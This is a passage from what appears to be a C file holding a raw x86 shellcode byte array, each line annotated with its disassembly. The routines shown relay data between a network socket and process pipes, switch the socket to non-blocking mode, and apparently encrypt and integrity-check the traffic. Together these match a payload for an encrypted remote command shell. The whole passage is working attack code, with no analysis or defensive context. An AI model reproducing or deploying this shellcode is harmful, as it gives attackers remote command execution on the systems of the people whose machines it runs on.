  /* 049B */ "\x83\xc3\xf4"                             /* add ebx, 0xfffffff4              */
  /* 049E */ "\x53"                                     /* push ebx                         */
  /* 049F */ "\x56"                                     /* push esi                         */
  /* 04A0 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 04A3 */ "\xe8\xcf\xfe\xff\xff"                     /* call 0x377                       */
  /* 04A8 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 04AB */ "\x6a\x03"                                 /* push 0x3                         */
  /* 04AD */ "\x8d\x3c\x33"                             /* lea edi, [ebx+esi]               */
  /* 04B0 */ "\x59"                                     /* pop ecx                          */
  /* 04B1 */ "\x8d\x75\xf4"                             /* lea esi, [ebp-0xc]               */
  /* 04B4 */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 04B6 */ "\xf3\xa7"                                 /* repe cmpsd                       */
  /* 04B8 */ "\x5f"                                     /* pop edi                          */
  /* 04B9 */ "\x74\x05"                                 /* jz 0x4c0                         */
  /* 04BB */ "\x6a\xfd"                                 /* push 0xfffffffd                  */
  /* 04BD */ "\x58"                                     /* pop eax                          */
  /* 04BE */ "\xeb\x2c"                                 /* jmp 0x4ec                        */
  /* 04C0 */ "\x8b\x75\x0c"                             /* mov esi, [ebp+0xc]               */
  /* 04C3 */ "\x53"                                     /* push ebx                         */
  /* 04C4 */ "\x56"                                     /* push esi                         */
  /* 04C5 */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 04C8 */ "\xe8\x4a\xff\xff\xff"                     /* call 0x417                       */
  /* 04CD */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 04D0 */ "\x83\x7d\x14\x00"                         /* cmp dword [ebp+0x14], 0x0        */
  /* 04D4 */ "\x75\x14"                                 /* jnz 0x4ea                        */
  /* 04D6 */ "\x8d\x04\x33"                             /* lea eax, [ebx+esi]               */
  /* 04D9 */ "\x50"                                     /* push eax                         */
  /* 04DA */ "\x53"                                     /* push ebx                         */
  /* 04DB */ "\x56"                                     /* push esi                         */
  /* 04DC */ "\xff\x75\x08"                             /* push dword [ebp+0x8]             */
  /* 04DF */ "\xe8\x93\xfe\xff\xff"                     /* call 0x377                       */
  /* 04E4 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 04E7 */ "\x83\xc3\x0c"                             /* add ebx, 0xc                     */
  /* 04EA */ "\x8b\xc3"                                 /* mov eax, ebx                     */
  /* 04EC */ "\x5e"                                     /* pop esi                          */
  /* 04ED */ "\x5b"                                     /* pop ebx                          */
  /* 04EE */ "\xc9"                                     /* leave                            */
  /* 04EF */ "\xc3"                                     /* ret                              */
  /* 04F0 */ "\x55"                                     /* push ebp                         */
  /* 04F1 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 04F3 */ "\x56"                                     /* push esi                         */
  /* 04F4 */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 04F6 */ "\x57"                                     /* push edi                         */
  /* 04F7 */ "\x39\x75\x10"                             /* cmp [ebp+0x10], esi              */
  /* 04FA */ "\x76\x25"                                 /* jbe 0x521                        */
  /* 04FC */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 04FF */ "\x8b\x45\x10"                             /* mov eax, [ebp+0x10]              */
  /* 0502 */ "\x6a\x00"                                 /* push 0x0                         */
  /* 0504 */ "\x2b\xc6"                                 /* sub eax, esi                     */
  /* 0506 */ "\x50"                                     /* push eax                         */
  /* 0507 */ "\x8b\x45\x0c"                             /* mov eax, [ebp+0xc]               */
  /* 050A */ "\x03\xc6"                                 /* add eax, esi                     */
  /* 050C */ "\x50"                                     /* push eax                         */
  /* 050D */ "\xff\xb7\x90\x08\x00\x00"                 /* push dword [edi+0x890]           */
  /* 0513 */ "\xff\x57\x44"                             /* call dword [edi+0x44]            */
  /* 0516 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0518 */ "\x7e\x0d"                                 /* jle 0x527                        */
  /* 051A */ "\x03\xf0"                                 /* add esi, eax                     */
  /* 051C */ "\x3b\x75\x10"                             /* cmp esi, [ebp+0x10]              */
  /* 051F */ "\x72\xde"                                 /* jb 0x4ff                         */
  /* 0521 */ "\x8b\xc6"                                 /* mov eax, esi                     */
  /* 0523 */ "\x5f"                                     /* pop edi                          */
  /* 0524 */ "\x5e"                                     /* pop esi                          */
  /* 0525 */ "\x5d"                                     /* pop ebp                          */
  /* 0526 */ "\xc3"                                     /* ret                              */
  /* 0527 */ "\x83\xc8\xff"                             /* or eax, 0xffffffff               */
  /* 052A */ "\xeb\xf7"                                 /* jmp 0x523                        */
  /* 052C */ "\x53"                                     /* push ebx                         */
  /* 052D */ "\x56"                                     /* push esi                         */
  /* 052E */ "\x8b\x74\x24\x0c"                         /* mov esi, [esp+0xc]               */
  /* 0532 */ "\x83\xbe\xc0\x08\x00\x00\x00"             /* cmp dword [esi+0x8c0], 0x0       */
  /* 0539 */ "\x57"                                     /* push edi                         */
  /* 053A */ "\x8d\x7e\x70"                             /* lea edi, [esi+0x70]              */
  /* 053D */ "\x8b\x1f"                                 /* mov ebx, [edi]                   */
  /* 053F */ "\x74\x17"                                 /* jz 0x558                         */
  /* 0541 */ "\x85\xdb"                                 /* test ebx, ebx                    */
  /* 0543 */ "\x74\x05"                                 /* jz 0x54a                         */
  /* 0545 */ "\x8d\x43\x0c"                             /* lea eax, [ebx+0xc]               */
  /* 0548 */ "\x89\x07"                                 /* mov [edi], eax                   */
  /* 054A */ "\x6a\x00"                                 /* push 0x0                         */
  /* 054C */ "\x6a\x04"                                 /* push 0x4                         */
  /* 054E */ "\x57"                                     /* push edi                         */
  /* 054F */ "\x56"                                     /* push esi                         */
  /* 0550 */ "\xe8\x2d\xff\xff\xff"                     /* call 0x482                       */
  /* 0555 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 0558 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 055A */ "\x57"                                     /* push edi                         */
  /* 055B */ "\x56"                                     /* push esi                         */
  /* 055C */ "\xe8\x8f\xff\xff\xff"                     /* call 0x4f0                       */
  /* 0561 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0564 */ "\x85\xdb"                                 /* test ebx, ebx                    */
  /* 0566 */ "\x74\x2f"                                 /* jz 0x597                         */
  /* 0568 */ "\x83\xbe\xc0\x08\x00\x00\x00"             /* cmp dword [esi+0x8c0], 0x0       */
  /* 056F */ "\x74\x15"                                 /* jz 0x586                         */
  /* 0571 */ "\x6a\x00"                                 /* push 0x0                         */
  /* 0573 */ "\x53"                                     /* push ebx                         */
  /* 0574 */ "\x8d\x86\x80\x00\x00\x00"                 /* lea eax, [esi+0x80]              */
  /* 057A */ "\x50"                                     /* push eax                         */
  /* 057B */ "\x56"                                     /* push esi                         */
  /* 057C */ "\xe8\x01\xff\xff\xff"                     /* call 0x482                       */
  /* 0581 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 0584 */ "\x8b\xd8"                                 /* mov ebx, eax                     */
  /* 0586 */ "\x53"                                     /* push ebx                         */
  /* 0587 */ "\x8d\x86\x80\x00\x00\x00"                 /* lea eax, [esi+0x80]              */
  /* 058D */ "\x50"                                     /* push eax                         */
  /* 058E */ "\x56"                                     /* push esi                         */
  /* 058F */ "\xe8\x5c\xff\xff\xff"                     /* call 0x4f0                       */
  /* 0594 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0597 */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 0599 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 059B */ "\x0f\x99\xc1"                             /* setns cl                         */
  /* 059E */ "\x5f"                                     /* pop edi                          */
  /* 059F */ "\x5e"                                     /* pop esi                          */
  /* 05A0 */ "\x5b"                                     /* pop ebx                          */
  /* 05A1 */ "\x8d\x41\xff"                             /* lea eax, [ecx-0x1]               */
  /* 05A4 */ "\xc3"                                     /* ret                              */
  /* 05A5 */ "\x55"                                     /* push ebp                         */
  /* 05A6 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 05A8 */ "\x56"                                     /* push esi                         */
  /* 05A9 */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 05AB */ "\x57"                                     /* push edi                         */
  /* 05AC */ "\x39\x75\x10"                             /* cmp [ebp+0x10], esi              */
  /* 05AF */ "\x76\x25"                                 /* jbe 0x5d6                        */
  /* 05B1 */ "\x8b\x7d\x08"                             /* mov edi, [ebp+0x8]               */
  /* 05B4 */ "\x8b\x45\x10"                             /* mov eax, [ebp+0x10]              */
  /* 05B7 */ "\x6a\x00"                                 /* push 0x0                         */
  /* 05B9 */ "\x2b\xc6"                                 /* sub eax, esi                     */
  /* 05BB */ "\x50"                                     /* push eax                         */
  /* 05BC */ "\x8b\x45\x0c"                             /* mov eax, [ebp+0xc]               */
  /* 05BF */ "\x03\xc6"                                 /* add eax, esi                     */
  /* 05C1 */ "\x50"                                     /* push eax                         */
  /* 05C2 */ "\xff\xb7\x90\x08\x00\x00"                 /* push dword [edi+0x890]           */
  /* 05C8 */ "\xff\x57\x48"                             /* call dword [edi+0x48]            */
  /* 05CB */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 05CD */ "\x7e\x0d"                                 /* jle 0x5dc                        */
  /* 05CF */ "\x03\xf0"                                 /* add esi, eax                     */
  /* 05D1 */ "\x3b\x75\x10"                             /* cmp esi, [ebp+0x10]              */
  /* 05D4 */ "\x72\xde"                                 /* jb 0x5b4                         */
  /* 05D6 */ "\x8b\xc6"                                 /* mov eax, esi                     */
  /* 05D8 */ "\x5f"                                     /* pop edi                          */
  /* 05D9 */ "\x5e"                                     /* pop esi                          */
  /* 05DA */ "\x5d"                                     /* pop ebp                          */
  /* 05DB */ "\xc3"                                     /* ret                              */
  /* 05DC */ "\x83\xc8\xff"                             /* or eax, 0xffffffff               */
  /* 05DF */ "\xeb\xf7"                                 /* jmp 0x5d8                        */
  /* 05E1 */ "\x56"                                     /* push esi                         */
  /* 05E2 */ "\x8b\x74\x24\x08"                         /* mov esi, [esp+0x8]               */
  /* 05E6 */ "\x57"                                     /* push edi                         */
  /* 05E7 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 05E9 */ "\x8d\x7e\x70"                             /* lea edi, [esi+0x70]              */
  /* 05EC */ "\x57"                                     /* push edi                         */
  /* 05ED */ "\x56"                                     /* push esi                         */
  /* 05EE */ "\xe8\xb2\xff\xff\xff"                     /* call 0x5a5                       */
  /* 05F3 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 05F6 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 05F8 */ "\x7f\x08"                                 /* jg 0x602                         */
  /* 05FA */ "\x83\xc8\xff"                             /* or eax, 0xffffffff               */
  /* 05FD */ "\xe9\x94\x00\x00\x00"                     /* jmp 0x696                        */
  /* 0602 */ "\x83\xbe\xc0\x08\x00\x00\x00"             /* cmp dword [esi+0x8c0], 0x0       */
  /* 0609 */ "\x74\x17"                                 /* jz 0x622                         */
  /* 060B */ "\x6a\x01"                                 /* push 0x1                         */
  /* 060D */ "\x6a\x10"                                 /* push 0x10                        */
  /* 060F */ "\x57"                                     /* push edi                         */
  /* 0610 */ "\x56"                                     /* push esi                         */
  /* 0611 */ "\xe8\x6c\xfe\xff\xff"                     /* call 0x482                       */
  /* 0616 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 0619 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 061B */ "\x79\x05"                                 /* jns 0x622                        */
  /* 061D */ "\x6a\xfc"                                 /* push 0xfffffffc                  */
  /* 061F */ "\x58"                                     /* pop eax                          */
  /* 0620 */ "\xeb\x74"                                 /* jmp 0x696                        */
  /* 0622 */ "\x0f\xb7\x07"                             /* movzx eax, word [edi]            */
  /* 0625 */ "\x66\x85\xc0"                             /* test ax, ax                      */
  /* 0628 */ "\x75\x04"                                 /* jnz 0x62e                        */
  /* 062A */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 062C */ "\xeb\x68"                                 /* jmp 0x696                        */
  /* 062E */ "\xb9\x0c\x08\x00\x00"                     /* mov ecx, 0x80c                   */
  /* 0633 */ "\x66\x3b\xc1"                             /* cmp ax, cx                       */
  /* 0636 */ "\x76\x04"                                 /* jbe 0x63c                        */
  /* 0638 */ "\x6a\xfe"                                 /* push 0xfffffffe                  */
  /* 063A */ "\xeb\xe3"                                 /* jmp 0x61f                        */
  /* 063C */ "\x66\x83\x7e\x72\x10"                     /* cmp word [esi+0x72], 0x10        */
  /* 0641 */ "\x73\xf5"                                 /* jae 0x638                        */
  /* 0643 */ "\x53"                                     /* push ebx                         */
  /* 0644 */ "\x50"                                     /* push eax                         */
  /* 0645 */ "\x8d\x9e\x80\x00\x00\x00"                 /* lea ebx, [esi+0x80]              */
  /* 064B */ "\x53"                                     /* push ebx                         */
  /* 064C */ "\x56"                                     /* push esi                         */
  /* 064D */ "\xe8\x53\xff\xff\xff"                     /* call 0x5a5                       */
  /* 0652 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0655 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0657 */ "\x7f\x05"                                 /* jg 0x65e                         */
  /* 0659 */ "\x83\xc8\xff"                             /* or eax, 0xffffffff               */
  /* 065C */ "\xeb\x37"                                 /* jmp 0x695                        */
  /* 065E */ "\x83\xbe\xc0\x08\x00\x00\x00"             /* cmp dword [esi+0x8c0], 0x0       */
  /* 0665 */ "\x74\x24"                                 /* jz 0x68b                         */
  /* 0667 */ "\x0f\xb7\x07"                             /* movzx eax, word [edi]            */
  /* 066A */ "\x6a\x01"                                 /* push 0x1                         */
  /* 066C */ "\x50"                                     /* push eax                         */
  /* 066D */ "\x53"                                     /* push ebx                         */
  /* 066E */ "\x56"                                     /* push esi                         */
  /* 066F */ "\xe8\x0e\xfe\xff\xff"                     /* call 0x482                       */
  /* 0674 */ "\x83\xc4\x10"                             /* add esp, 0x10                    */
  /* 0677 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 0679 */ "\x79\x05"                                 /* jns 0x680                        */
  /* 067B */ "\x6a\xfc"                                 /* push 0xfffffffc                  */
  /* 067D */ "\x58"                                     /* pop eax                          */
  /* 067E */ "\xeb\x15"                                 /* jmp 0x695                        */
  /* 0680 */ "\x66\x89\x07"                             /* mov [edi], ax                    */
  /* 0683 */ "\xc6\x84\x30\x80\x00\x00\x00\x00"         /* mov byte [eax+esi+0x80], 0x0     */
  /* 068B */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 068D */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 068F */ "\x0f\x9f\xc1"                             /* setg cl                          */
  /* 0692 */ "\x8d\x41\xff"                             /* lea eax, [ecx-0x1]               */
  /* 0695 */ "\x5b"                                     /* pop ebx                          */
  /* 0696 */ "\x5f"                                     /* pop edi                          */
  /* 0697 */ "\x5e"                                     /* pop esi                          */
  /* 0698 */ "\xc3"                                     /* ret                              */
  /* 0699 */ "\x55"                                     /* push ebp                         */
  /* 069A */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 069C */ "\x81\xec\x14\x01\x00\x00"                 /* sub esp, 0x114                   */
  /* 06A2 */ "\x56"                                     /* push esi                         */
  /* 06A3 */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 06A6 */ "\x57"                                     /* push edi                         */
  /* 06A7 */ "\x8d\x45\xc0"                             /* lea eax, [ebp-0x40]              */
  /* 06AA */ "\x50"                                     /* push eax                         */
  /* 06AB */ "\x6a\x40"                                 /* push 0x40                        */
  /* 06AD */ "\xff\xb6\xc4\x08\x00\x00"                 /* push dword [esi+0x8c4]           */
  /* 06B3 */ "\xff\x56\x68"                             /* call dword [esi+0x68]            */
  /* 06B6 */ "\x8d\x85\xec\xfe\xff\xff"                 /* lea eax, [ebp-0x114]             */
  /* 06BC */ "\x6a\x40"                                 /* push 0x40                        */
  /* 06BE */ "\x50"                                     /* push eax                         */
  /* 06BF */ "\xe8\xf5\x07\x00\x00"                     /* call 0xeb9                       */
  /* 06C4 */ "\x6a\x40"                                 /* push 0x40                        */
  /* 06C6 */ "\x8d\x45\xc0"                             /* lea eax, [ebp-0x40]              */
  /* 06C9 */ "\x50"                                     /* push eax                         */
  /* 06CA */ "\x8d\x85\xec\xfe\xff\xff"                 /* lea eax, [ebp-0x114]             */
  /* 06D0 */ "\x50"                                     /* push eax                         */
  /* 06D1 */ "\xe8\x0a\x08\x00\x00"                     /* call 0xee0                       */
  /* 06D6 */ "\x8d\x85\xec\xfe\xff\xff"                 /* lea eax, [ebp-0x114]             */
  /* 06DC */ "\x50"                                     /* push eax                         */
  /* 06DD */ "\x8d\xbe\xc8\x08\x00\x00"                 /* lea edi, [esi+0x8c8]             */
  /* 06E3 */ "\x57"                                     /* push edi                         */
  /* 06E4 */ "\xe8\x35\x08\x00\x00"                     /* call 0xf1e                       */
  /* 06E9 */ "\x81\xc6\x08\x11\x00\x00"                 /* add esi, 0x1108                  */
  /* 06EF */ "\x56"                                     /* push esi                         */
  /* 06F0 */ "\x57"                                     /* push edi                         */
  /* 06F1 */ "\xe8\x0b\x0a\x00\x00"                     /* call 0x1101                      */
  /* 06F6 */ "\x83\xc4\x24"                             /* add esp, 0x24                    */
  /* 06F9 */ "\x5f"                                     /* pop edi                          */
  /* 06FA */ "\x5e"                                     /* pop esi                          */
  /* 06FB */ "\xc9"                                     /* leave                            */
  /* 06FC */ "\xc3"                                     /* ret                              */
  /* 06FD */ "\x55"                                     /* push ebp                         */
  /* 06FE */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0700 */ "\xb8\x00\x80\x00\x00"                     /* mov eax, 0x8000                  */
  /* 0705 */ "\xe8\xd6\x0e\x00\x00"                     /* call 0x15e0                      */
  /* 070A */ "\x53"                                     /* push ebx                         */
  /* 070B */ "\x8b\x5d\x08"                             /* mov ebx, [ebp+0x8]               */
  /* 070E */ "\x53"                                     /* push ebx                         */
  /* 070F */ "\xe8\x85\xff\xff\xff"                     /* call 0x699                       */
  /* 0714 */ "\x8d\x85\x00\xa0\xff\xff"                 /* lea eax, [ebp-0x6000]            */
  /* 071A */ "\x50"                                     /* push eax                         */
  /* 071B */ "\xe8\xb5\x0b\x00\x00"                     /* call 0x12d5                      */
  /* 0720 */ "\x8d\x85\x00\xc0\xff\xff"                 /* lea eax, [ebp-0x4000]            */
  /* 0726 */ "\x50"                                     /* push eax                         */
  /* 0727 */ "\xe8\xa9\x0b\x00\x00"                     /* call 0x12d5                      */
  /* 072C */ "\x8d\x85\x00\xe0\xff\xff"                 /* lea eax, [ebp-0x2000]            */
  /* 0732 */ "\x50"                                     /* push eax                         */
  /* 0733 */ "\xe8\x9d\x0b\x00\x00"                     /* call 0x12d5                      */
  /* 0738 */ "\x53"                                     /* push ebx                         */
  /* 0739 */ "\xc7\x85\x00\xc0\xff\xff\x01\x00\x01\x00" /* mov dword [ebp-0x4000], 0x10001  */
  /* 0743 */ "\xe8\x99\xfe\xff\xff"                     /* call 0x5e1                       */
  /* 0748 */ "\x83\xc4\x14"                             /* add esp, 0x14                    */
  /* 074B */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 074D */ "\x75\x7f"                                 /* jnz 0x7ce                        */
  /* 074F */ "\x0f\xb7\x4b\x70"                         /* movzx ecx, word [ebx+0x70]       */
  /* 0753 */ "\x56"                                     /* push esi                         */
  /* 0754 */ "\x57"                                     /* push edi                         */
  /* 0755 */ "\x6a\x40"                                 /* push 0x40                        */
  /* 0757 */ "\x8d\xb3\x80\x00\x00\x00"                 /* lea esi, [ebx+0x80]              */
  /* 075D */ "\x8d\xbd\x00\xe0\xff\xff"                 /* lea edi, [ebp-0x2000]            */
  /* 0763 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 0765 */ "\x59"                                     /* pop ecx                          */
  /* 0766 */ "\x68\xbe\x00\x00\x00"                     /* push 0xbe                        */
  /* 076B */ "\x8d\x85\x40\xa0\xff\xff"                 /* lea eax, [ebp-0x5fc0]            */
  /* 0771 */ "\x50"                                     /* push eax                         */
  /* 0772 */ "\x8d\xb3\xc8\x08\x00\x00"                 /* lea esi, [ebx+0x8c8]             */
  /* 0778 */ "\x8d\xbd\x00\xa0\xff\xff"                 /* lea edi, [ebp-0x6000]            */
  /* 077E */ "\x53"                                     /* push ebx                         */
  /* 077F */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 0781 */ "\xe8\xdb\xfb\xff\xff"                     /* call 0x361                       */
  /* 0786 */ "\x8d\x85\x00\xe0\xff\xff"                 /* lea eax, [ebp-0x2000]            */
  /* 078C */ "\x50"                                     /* push eax                         */
  /* 078D */ "\x8d\x85\x00\xc0\xff\xff"                 /* lea eax, [ebp-0x4000]            */
  /* 0793 */ "\x50"                                     /* push eax                         */
  /* 0794 */ "\x8d\x85\x00\xa0\xff\xff"                 /* lea eax, [ebp-0x6000]            */
  /* 079A */ "\x50"                                     /* push eax                         */
  /* 079B */ "\x8d\x85\x00\x80\xff\xff"                 /* lea eax, [ebp-0x8000]            */
  /* 07A1 */ "\x50"                                     /* push eax                         */
  /* 07A2 */ "\xe8\x76\x0d\x00\x00"                     /* call 0x151d                      */
  /* 07A7 */ "\x8b\x4b\x70"                             /* mov ecx, [ebx+0x70]              */
  /* 07AA */ "\x8d\xb5\x00\x80\xff\xff"                 /* lea esi, [ebp-0x8000]            */
  /* 07B0 */ "\x8d\xbb\x80\x00\x00\x00"                 /* lea edi, [ebx+0x80]              */
  /* 07B6 */ "\x53"                                     /* push ebx                         */
  /* 07B7 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 07B9 */ "\xe8\x6e\xfd\xff\xff"                     /* call 0x52c                       */
  /* 07BE */ "\x83\xc4\x20"                             /* add esp, 0x20                    */
  /* 07C1 */ "\x5f"                                     /* pop edi                          */
  /* 07C2 */ "\x5e"                                     /* pop esi                          */
  /* 07C3 */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 07C5 */ "\x75\x07"                                 /* jnz 0x7ce                        */
  /* 07C7 */ "\x40"                                     /* inc eax                          */
  /* 07C8 */ "\x89\x83\xc0\x08\x00\x00"                 /* mov [ebx+0x8c0], eax             */
  /* 07CE */ "\x5b"                                     /* pop ebx                          */
  /* 07CF */ "\xc9"                                     /* leave                            */
  /* 07D0 */ "\xc3"                                     /* ret                              */
  /* 07D1 */ "\x55"                                     /* push ebp                         */
  /* 07D2 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 07D4 */ "\x83\xec\x30"                             /* sub esp, 0x30                    */
  /* 07D7 */ "\x56"                                     /* push esi                         */
  /* 07D8 */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 07DB */ "\x57"                                     /* push edi                         */
  /* 07DC */ "\x6a\x21"                                 /* push 0x21                        */
  /* 07DE */ "\x8d\xbe\xa4\x08\x00\x00"                 /* lea edi, [esi+0x8a4]             */
  /* 07E4 */ "\xff\x37"                                 /* push dword [edi]                 */
  /* 07E6 */ "\xff\xb6\x90\x08\x00\x00"                 /* push dword [esi+0x890]           */
  /* 07EC */ "\xff\x56\x54"                             /* call dword [esi+0x54]            */
  /* 07EF */ "\x6a\xff"                                 /* push 0xffffffff                  */
  /* 07F1 */ "\x6a\x00"                                 /* push 0x0                         */
  /* 07F3 */ "\x57"                                     /* push edi                         */
  /* 07F4 */ "\xff\xb6\xbc\x08\x00\x00"                 /* push dword [esi+0x8bc]           */
  /* 07FA */ "\xff\x56\x30"                             /* call dword [esi+0x30]            */
  /* 07FD */ "\x89\x45\x08"                             /* mov [ebp+0x8], eax               */
  /* 0800 */ "\x8d\x45\xd0"                             /* lea eax, [ebp-0x30]              */
  /* 0803 */ "\x50"                                     /* push eax                         */
  /* 0804 */ "\xff\x37"                                 /* push dword [edi]                 */
  /* 0806 */ "\xff\xb6\x90\x08\x00\x00"                 /* push dword [esi+0x890]           */
  /* 080C */ "\xff\x56\x58"                             /* call dword [esi+0x58]            */
  /* 080F */ "\x6a\x00"                                 /* push 0x0                         */
  /* 0811 */ "\xff\x37"                                 /* push dword [edi]                 */
  /* 0813 */ "\xff\xb6\x90\x08\x00\x00"                 /* push dword [esi+0x890]           */
  /* 0819 */ "\xff\x56\x54"                             /* call dword [esi+0x54]            */
  /* 081C */ "\x83\x65\xfc\x00"                         /* and dword [ebp-0x4], 0x0         */
  /* 0820 */ "\x8d\x45\xfc"                             /* lea eax, [ebp-0x4]               */
  /* 0823 */ "\x50"                                     /* push eax                         */
  /* 0824 */ "\x68\x7e\x66\x04\x80"                     /* push 0x8004667e                  */
  /* 0829 */ "\xff\xb6\x90\x08\x00\x00"                 /* push dword [esi+0x890]           */
  /* 082F */ "\xff\x56\x50"                             /* call dword [esi+0x50]            */
  /* 0832 */ "\xf6\x45\xd0\x20"                         /* test byte [ebp-0x30], 0x20       */
  /* 0836 */ "\x5f"                                     /* pop edi                          */
  /* 0837 */ "\x5e"                                     /* pop esi                          */
  /* 0838 */ "\x74\x04"                                 /* jz 0x83e                         */
  /* 083A */ "\x83\x4d\x08\xff"                         /* or dword [ebp+0x8], 0xffffffff   */
  /* 083E */ "\x8b\x45\x08"                             /* mov eax, [ebp+0x8]               */
  /* 0841 */ "\xc9"                                     /* leave                            */
  /* 0842 */ "\xc3"                                     /* ret                              */
  /* 0843 */ "\x55"                                     /* push ebp                         */
  /* 0844 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0846 */ "\x83\xec\x18"                             /* sub esp, 0x18                    */
  /* 0849 */ "\x53"                                     /* push ebx                         */
  /* 084A */ "\x56"                                     /* push esi                         */
  /* 084B */ "\x8b\x75\x08"                             /* mov esi, [ebp+0x8]               */
  /* 084E */ "\x57"                                     /* push edi                         */
  /* 084F */ "\x33\xdb"                                 /* xor ebx, ebx                     */
  /* 0851 */ "\x6a\x14"                                 /* push 0x14                        */
  /* 0853 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 0855 */ "\x8d\x7d\xe8"                             /* lea edi, [ebp-0x18]              */
  /* 0858 */ "\x59"                                     /* pop ecx                          */
  /* 0859 */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 085B */ "\x8b\x86\xa8\x08\x00\x00"                 /* mov eax, [esi+0x8a8]             */
  /* 0861 */ "\x89\x5d\xfc"                             /* mov [ebp-0x4], ebx               */
  /* 0864 */ "\xc7\x86\xbc\x08\x00\x00\x03\x00\x00\x00" /* mov dword [esi+0x8bc], 0x3       */
  /* 086E */ "\x89\x45\xf8"                             /* mov [ebp-0x8], eax               */
  /* 0871 */ "\x56"                                     /* push esi                         */
  /* 0872 */ "\xe8\x5a\xff\xff\xff"                     /* call 0x7d1                       */
  /* 0877 */ "\x59"                                     /* pop ecx                          */
  /* 0878 */ "\x3b\xc3"                                 /* cmp eax, ebx                     */
  /* 087A */ "\x75\x25"                                 /* jnz 0x8a1                        */
  /* 087C */ "\x56"                                     /* push esi                         */
  /* 087D */ "\xe8\x5f\xfd\xff\xff"                     /* call 0x5e1                       */
  /* 0882 */ "\x8d\x46\x70"                             /* lea eax, [esi+0x70]              */
  /* 0885 */ "\x59"                                     /* pop ecx                          */
  /* 0886 */ "\x8b\x08"                                 /* mov ecx, [eax]                   */
  /* 0888 */ "\x3b\xcb"                                 /* cmp ecx, ebx                     */
  /* 088A */ "\x76\x6c"                                 /* jbe 0x8f8                        */
  /* 088C */ "\x53"                                     /* push ebx                         */
  /* 088D */ "\x50"                                     /* push eax                         */
  /* 088E */ "\x51"                                     /* push ecx                         */
  /* 088F */ "\x8d\x86\x80\x00\x00\x00"                 /* lea eax, [esi+0x80]              */
  /* 0895 */ "\x50"                                     /* push eax                         */
  /* 0896 */ "\xff\xb6\x98\x08\x00\x00"                 /* push dword [esi+0x898]           */
  /* 089C */ "\xff\x56\x0c"                             /* call dword [esi+0xc]             */
  /* 089F */ "\xeb\xd0"                                 /* jmp 0x871                        */
  /* 08A1 */ "\x83\xf8\x01"                             /* cmp eax, 0x1                     */
  /* 08A4 */ "\x75\x52"                                 /* jnz 0x8f8                        */
  /* 08A6 */ "\x8d\x7e\x70"                             /* lea edi, [esi+0x70]              */
  /* 08A9 */ "\x8d\x45\xe8"                             /* lea eax, [ebp-0x18]              */
  /* 08AC */ "\x39\x5d\xfc"                             /* cmp [ebp-0x4], ebx               */
  /* 08AF */ "\x75\x20"                                 /* jnz 0x8d1                        */
  /* 08B1 */ "\x50"                                     /* push eax                         */
  /* 08B2 */ "\x57"                                     /* push edi                         */
  /* 08B3 */ "\x68\x00\x02\x00\x00"                     /* push 0x200                       */
  /* 08B8 */ "\x8d\x86\x80\x00\x00\x00"                 /* lea eax, [esi+0x80]              */
  /* 08BE */ "\x50"                                     /* push eax                         */
  /* 08BF */ "\xff\xb6\x94\x08\x00\x00"                 /* push dword [esi+0x894]           */
  /* 08C5 */ "\xff\x56\x10"                             /* call dword [esi+0x10]            */
  /* 08C8 */ "\xc7\x45\xfc\x01\x00\x00\x00"             /* mov dword [ebp-0x4], 0x1         */
  /* 08CF */ "\xeb\x10"                                 /* jmp 0x8e1                        */
  /* 08D1 */ "\x53"                                     /* push ebx                         */
  /* 08D2 */ "\x57"                                     /* push edi                         */
  /* 08D3 */ "\x50"                                     /* push eax                         */
  /* 08D4 */ "\xff\xb6\x94\x08\x00\x00"                 /* push dword [esi+0x894]           */
  /* 08DA */ "\xff\x56\x14"                             /* call dword [esi+0x14]            */
  /* 08DD */ "\x85\xc0"                                 /* test eax, eax                    */
  /* 08DF */ "\x74\x17"                                 /* jz 0x8f8                         */
  /* 08E1 */ "\x39\x1f"                                 /* cmp [edi], ebx                   */
  /* 08E3 */ "\x74\x8c"                                 /* jz 0x871                         */
